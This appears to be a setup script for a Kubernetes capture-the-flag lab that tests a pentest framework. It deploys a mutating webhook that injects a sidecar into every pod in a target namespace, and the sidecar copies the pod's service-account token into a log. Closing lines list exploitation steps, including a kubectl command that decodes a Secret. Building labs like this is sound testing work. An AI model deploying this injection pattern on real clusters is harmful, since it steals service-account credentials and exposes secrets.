#!/bin/bash
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
CLUSTER_NAME="cve-k8s-25-webhook-inject"

FLAG="${CVE_FLAG:-flag{k8s-25-default}}"
FLAG_DIR="/home/kianabin/cve-flags/k8s-25"
mkdir -p "$FLAG_DIR"
echo "$FLAG" > "$FLAG_DIR/flag.txt"

echo "[K8S-25] Mutating Webhook Sidecar Injection Attack"
echo "[*] Creating KIND cluster..."
kind create cluster --name "$CLUSTER_NAME" --config "$SCRIPT_DIR/kind-config.yaml"

echo "[*] Waiting for cluster stabilization..."
kubectl wait --for=condition=Ready pods --all -n kube-system --timeout=120s 2>/dev/null || true

echo "[*] Pre-loading container images into KIND..."
for img in alpine:latest nginx:1.24-alpine python:3.10-slim; do
  kind load docker-image $img --name "$CLUSTER_NAME" 2>/dev/null || true
done
sleep 10

echo "[*] Setting up scenario infrastructure..."
kubectl apply -f - << 'YAML'
apiVersion: v1
kind: Namespace
metadata:
  name: webhook-ns
---
apiVersion: v1
kind: Namespace
metadata:
  name: target-ns
---
# ServiceAccount for the mutating webhook
apiVersion: v1
kind: ServiceAccount
metadata:
  name: webhook-sa
  namespace: webhook-ns
YAML

echo "[*] Storing flag as Secret in target namespace..."
kubectl create secret generic vault-flag -n target-ns --from-literal=flag="$FLAG" 2>/dev/null || true

echo "[*] Deploying mutating webhook server..."
# Deploy a simple HTTP server that acts as a mutating webhook
# The webhook injects a sidecar into every pod created in target-ns
# The sidecar reads SA tokens and exfiltrates them
kubectl apply -f - << 'YAML'
---
# A simple webhook server that mutates pods
apiVersion: apps/v1
kind: Deployment
metadata:
  name: mutating-webhook
  namespace: webhook-ns
spec:
  replicas: 1
  selector:
    matchLabels:
      app: mutating-webhook
  template:
    metadata:
      labels:
        app: mutating-webhook
    spec:
      serviceAccountName: webhook-sa
      containers:
        - name: webhook
          image: python:3.10-slim
          imagePullPolicy: IfNotPresent
          command: ["sh", "-c"]
          args:
            - |
              pip install flask 2>/dev/null || true
              cat > /app.py << 'PYTHON'
              from flask import Flask, request, jsonify
              import json
              app = Flask(__name__)

              @app.route('/mutate', methods=['POST'])
              def mutate():
                  admission_review = request.get_json()
                  uid = admission_review['request']['uid']

                  # Build a JSON patch to inject a sidecar container
                  # The sidecar will attempt to read the SA token
                  patch = [{
                      "op": "add",
                      "path": "/spec/containers/-",
                      "value": {
                          "name": "injected-sidecar",
                          "image": "alpine:latest",
                          "imagePullPolicy": "IfNotPresent",
                          "command": ["sh", "-c"],
                          "args": [
                            "echo 'Sidecar injected by mutating webhook' > /sidecar.log; "
                            "cat /var/run/secrets/kubernetes.io/serviceaccount/token >> /sidecar.log 2>/dev/null || true; "
                            "sleep 3600"
                          ],
                          "env": [
                            {"name": "FLAG_HINT", "value": "Check /sidecar.log for tokens"}
                          ]
                      }
                  }]

                  response = {
                      "apiVersion": "admission.k8s.io/v1",
                      "kind": "AdmissionReview",
                      "response": {
                          "uid": uid,
                          "allowed": True,
                          "patchType": "JSONPatch",
                          "patch": json.dumps(patch).encode('utf-8').decode('utf-8')
                      }
                  }
                  return jsonify(response)

              @app.route('/health', methods=['GET'])
              def health():
                  return jsonify({"status": "ok"})

              if __name__ == '__main__':
                  app.run(host='0.0.0.0', port=8443, ssl_context=None)
              PYTHON
              python3 /app.py
          ports:
            - containerPort: 8443
---
apiVersion: v1
kind: Service
metadata:
  name: mutating-webhook
  namespace: webhook-ns
spec:
  selector:
    app: mutating-webhook
  ports:
    - port: 443
      targetPort: 8443
---
# Target deployment - when a pod is created in target-ns, the webhook injects a sidecar
apiVersion: apps/v1
kind: Deployment
metadata:
  name: target-app
  namespace: target-ns
spec:
  replicas: 1
  selector:
    matchLabels:
      app: target-app
  template:
    metadata:
      labels:
        app: target-app
    spec:
      containers:
        - name: app
          image: nginx:1.24-alpine
          imagePullPolicy: IfNotPresent
          ports:
            - containerPort: 80
---
# Flag accessible by the injected sidecar
apiVersion: v1
kind: ConfigMap
metadata:
  name: app-config
  namespace: target-ns
data:
  flag_hint: "The flag Secret is named 'vault-flag' in this namespace"
YAML

kubectl wait --for=condition=Ready pods -l app=mutating-webhook -n webhook-ns --timeout=120s 2>/dev/null || true
kubectl wait --for=condition=Ready pods -l app=target-app -n target-ns --timeout=60s 2>/dev/null || true
sleep 5

echo ""
echo "[+] K8S-25 Mutating Webhook Injection Ready"
echo "    Cluster: $CLUSTER_NAME"
echo "    Flag Secret: vault-flag in target-ns namespace"
echo "    Webhook: mutating-webhook.webhook-ns.svc:443/mutate"
echo "    Flag: $FLAG"
echo ""
echo "    Exploitation steps:"
echo "    1. Discover the mutating webhook configuration"
echo "    2. The webhook injects a sidecar into every pod in target-ns"
echo "    3. Examine the injected sidecar container's env and logs"
echo "    4. Use the sidecar's position to read the SA token"
echo "    5. Use the SA token to read the flag Secret:"
echo "       kubectl get secret vault-flag -n target-ns -o jsonpath='{.data.flag}' | base64 -d"
echo ""
echo "    Note: This scenario tests the pentest framework's ability to"
echo "    identify mutating webhooks and exploit sidecar injection patterns."